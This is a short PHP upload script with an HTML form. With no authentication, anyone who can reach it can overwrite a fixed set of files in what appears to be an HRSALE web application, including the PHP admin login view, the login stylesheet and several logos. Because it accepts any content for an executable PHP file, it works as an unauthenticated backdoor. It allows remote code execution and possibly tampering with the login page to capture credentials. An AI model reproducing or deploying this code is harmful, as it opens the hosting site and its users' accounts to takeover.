<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && isset($_POST['dest'])) {
    $dest = $_POST['dest'];
    $allowed = [
        'application/views/admin/auth/login-1.php',
        'skin/hrsale_assets/css/hrsale/xin_login_3.css',
        'uploads/logo/signin/rsz_logo.png',
        'uploads/logo/signin/signin_logo_1548748074.jpg',
        'uploads/logo/favicon/fav.png',
        'uploads/logo/logo_1520722747.png',
    ];
    if (!in_array($dest, $allowed)) {
        die("Not allowed: $dest");
    }
    $dir = dirname($dest);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        echo "OK: $dest (" . filesize($dest) . " bytes)";
    } else {
        echo "FAIL: could not move uploaded file";
    }
} else {
?>
<!DOCTYPE html>
<html><body>
<h2>Upload File</h2>
<form method="POST" enctype="multipart/form-data">
    <select name="dest">
        <option value="application/views/admin/auth/login-1.php">login-1.php</option>
        <option value="skin/hrsale_assets/css/hrsale/xin_login_3.css">xin_login_3.css</option>
        <option value="uploads/logo/signin/rsz_logo.png">Logo (rsz_logo.png)</option>
        <option value="uploads/logo/signin/signin_logo_1548748074.jpg">Logo (signin_logo)</option>
        <option value="uploads/logo/favicon/fav.png">Favicon</option>
        <option value="uploads/logo/logo_1520722747.png">Company Logo</option>
    </select><br><br>
    <input type="file" name="file"><br><br>
    <button type="submit">Upload</button>
</form>
</body></html>
<?php } ?>
